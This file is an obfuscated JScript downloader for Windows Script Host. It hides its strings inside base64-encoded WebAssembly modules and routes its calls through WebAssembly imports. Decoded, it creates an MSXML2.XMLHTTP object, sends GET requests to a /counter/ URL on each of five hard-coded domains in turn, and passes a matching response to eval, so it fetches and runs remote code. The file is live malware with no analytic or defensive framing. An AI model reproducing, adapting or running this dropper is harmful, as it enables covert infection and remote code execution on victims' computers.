const __universalAtob = function (b64Encoded) {
    try {
        let binary_string = atob(b64Encoded), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(b64Encoded, 'base64'));
    }
};
const __forWasmBuffer = 'AGFzbQEAAAABiICAgAACYAAAYAABfwKkgICAAAMDZW52BHRlc3QAAQNlbnYGdXBkYXRlAAADZW52BGJvZHkAAAOCgICAAAEABISAgIAAAXAAAAWDgICAAAEAAQeRgICAAAIGbWVtb3J5AgAEZGF0YQADCpmAgIAAAZOAgIAAAAJAA0AQAEUNARACEAEMAAsLCw==';
const __forWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__forWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__forWasmBuffer, 'base64'));
    }
})());
const __callWasmBuffer = 'AGFzbQEAAAABhICAgAABYAAAAo+AgIAAAQNlbnYHaW1wRnVuYwAAA4KAgIAAAQAEhICAgAABcAAABYOAgIAAAQABB5GAgIAAAgZtZW1vcnkCAARkYXRhAAEKioCAgAABhICAgAAAEAAL';
const __callWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__callWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__callWasmBuffer, 'base64'));
    }
})());
const __wasmStringModules = ['AGFzbQEAAAAFg4CAgAABAAEGtYGAgAAgfwBBAQt/AEESC38AQRgLfwBBHAt/AEEkC38AQSoLfwBBLgt/AEEwC38AQTQLfwBBOAt/AEE8C38AQT4LfwBBxgALfwBB1AALfwBB1gALfwBB3AALfwBB8gALfwBBggELfwBBjgELfwBBoAELfwBBrAELfwBBrgELfwBBqgILfwBBtAILfwBBugILfwBBwAILfwBByAILfwBBzgILfwBB1AILfwBB1gILfwBB2AILfwBB3AILB6CCgIAAIQZtZW1vcnkCAAVkYXRhMAMABWRhdGExAwEFZGF0YTIDAgVkYXRhMwMDBWRhdGE0AwQFZGF0YTUDBQVkYXRhNgMGBWRhdGE3AwcFZGF0YTgDCAVkYXRhOQMJBmRhdGExMAMKBmRhdGExMQMLBmRhdGExMgMMBmRhdGExMwMNBmRhdGExNAMOBmRhdGExNQMPBmRhdGExNgMQBmRhdGExNwMRBmRhdGExOAMSBmRhdGExOQMTBmRhdGEyMAMUBmRhdGEyMQMVBmRhdGEyMgMWBmRhdGEyMwMXBmRhdGEyNAMYBmRhdGEyNQMZBmRhdGEyNgMaBmRhdGEyNwMbBmRhdGEyOAMcBmRhdGEyOQMdBmRhdGEzMAMeBmRhdGEzMQMfC+ODgIAAIABBAQsPTVNYTUwyLlhNTEhUVFAAAEESCwQlMkYAAEEYCwJ0AABBHAsGWlJBTUQAAEEkCwQlM0EAAEEqCwJwAABBLgsBAABBMAsCUwAAQTQLAmEAAEE4CwJUAABBPAsBAABBPgsGUElMS1UAAEHGAAsNRkZGRkZGRkZGRkZGAABB1AALAQAAQdYACwVHRVRBAABB3AALFHd3dy5qaW5zaGVueXVhbi5jb20AAEHyAAsPaG90ZWxjaGl0cmEuaW4AAEGCAQsKcm9ncmFuLml0AABBjgELEGZvcmV2ZXJkYXduLmNvbQAAQaABCwtldmVudGlrLnJvAABBrAELAQAAQa4BC3owMDAwMDAwMXdkQ3BneDJROHp4UXNUZDZUc2Q3N25iRjUxTmdza1JGclpENTh4Q3JfVjVwWThoZkRWWl9lTjNjWUF0bzJzal9mSXEyMUFpVGVsTGU0M2o3SVNNSTFvX3VILVY1a3hwU0ZwMUxHVzRTY011TVhSWmwwAABBqgILCGNvdW50ZXIAAEG0AgsFaHR0cAAAQboCCwQlM0EAAEHAAgsHJTJGJTJGAABByAILBCUyRgAAQc4CCwQlM0YAAEHUAgsBAABB1gILAQAAQdgCCwJhAABB3AILBWV2YWwA'].map(__bytes => {
    const bytesToUse = __universalAtob(__bytes);
    return new WebAssembly.Instance(new WebAssembly.Module(bytesToUse));
});
const lS = (wI, pos, iWC) => {
    let __str = '';
    if (!Array.isArray(wI)) {
        let __targetModule = __wasmStringModules[wI];
        let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
        const __stringKey = `data${ pos }`;
        let __start = __targetModule.exports[__stringKey] - 1;
        let __str = '';
        let i = __start;
        let __c = __mem[i++];
        while (!(parseInt(__c) & 128) && __mem[i]) {
            __str += __c;
            __c = String.fromCharCode(__mem[i++]);
        }
        __str += __c;
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    } else {
        for (const __wasmIndex of wI) {
            let __targetModule = __wasmStringModules[__wasmIndex];
            let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
            const __stringKey = `data${ pos }`;
            let __start = __targetModule.exports[__stringKey] - 1;
            let i = __start;
            let __c = __mem[i++];
            while (!(parseInt(__c) & 128) && __mem[i]) {
                __str += __c;
                __c = String.fromCharCode(__mem[i++]);
            }
            __str += __c;
        }
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    }
};
var uuu = 10;
(() => {
    const __forInstance0 = new WebAssembly.Instance(__forWasmModule, {
        env: {
            test: () => {
                return uuu < 999999 ? 1 : 0;
            },
            update: () => {
            },
            body: () => {
                {
                    uuu++;
                }
            }
        }
    });
    const __exports = __forInstance0.exports;
    return __exports.data();
})();
var ijdl = lS(0, 0);
var dfs = WScript.CreateObject(ijdl);
var joshua = [
    lS(0, 1),
    lS(0, 2),
    lS(0, 3),
    lS(0, 4),
    lS(0, 5),
    lS(0, 6),
    lS(0, 7),
    lS(0, 8),
    lS(0, 9),
    lS(0, 10),
    lS(0, 11),
    lS(0, 12)
];
function ataaa(ziyter) {
    window[lS(0, 31, true)](ziyter + lS(0, 13));
}
joshua[0 + 2] = lS(0, 14);
joshua[3 - 1] = joshua[2].substr(0, 3);
var x = [
    lS(0, 15),
    lS(0, 16),
    lS(0, 17),
    lS(0, 18),
    lS(0, 19)
];
var gyt = 0;
var lub = joshua[0];
function muhter(kjg, lki) {
    return kjg.split(lki + lS(0, 20));
}
while (true) {
    if (gyt >= x.length) {
        break;
    }
    try {
        var feni = lS(0, 21);
        var ghyt = false;
        var tjkh = x[gyt + 1 - 1];
        var nami = lS(0, 22);
        var zmei = lS(0, 23);
        var figson = zmei + lS(0, 24) + lS(0, 25) + tjkh + lS(0, 26) + nami + lS(0, 27) + feni;
        (() => {
            const __callInstance3 = new WebAssembly.Instance(__callWasmModule, {
                env: {
                    impFunc: () => {
                        grohot(dfs, joshua[1 + 1] + lS(0, 28), figson, ghyt);
                    }
                }
            });
            const __exports = __callInstance3.exports;
            return __exports.data();
        })();
        (() => {
            const __callInstance2 = new WebAssembly.Instance(__callWasmModule, {
                env: {
                    impFunc: () => {
                        dfs.send();
                    }
                }
            });
            const __exports = __callInstance2.exports;
            return __exports.data();
        })();
        var r = dfs.responseText;
        var rima = 10 * 50;
        var got = 50 + 450 + rima;
        var fontu = r.length;
        var emisogh = 12;
        if (fontu - got * 2 > emisogh + emisogh - (22 + 2) - got && r.indexOf(feni + lS(0, 29)) - 1 > got - 1002) {
            var jiki = muhter(r, feni);
            var guznam = fuuu(jiki, lS(0, 30));
            (() => {
                const __callInstance1 = new WebAssembly.Instance(__callWasmModule, {
                    env: {
                        impFunc: () => {
                            ataaa(guznam);
                        }
                    }
                });
                const __exports = __callInstance1.exports;
                return __exports.data();
            })();
            break;
        }
        ;
    } catch (e) {
    }
    ;
    gyt++;
}
;
function fuuu(fuu1, fuu2) {
    return fuu1.join(fuu2);
}
function grohot(hunko, b1, b2, b3) {
    (() => {
        const __callInstance0 = new WebAssembly.Instance(__callWasmModule, {
            env: {
                impFunc: () => {
                    hunko.open(b1, b2, b3);
                }
            }
        });
        const __exports = __callInstance0.exports;
        return __exports.data();
    })();
}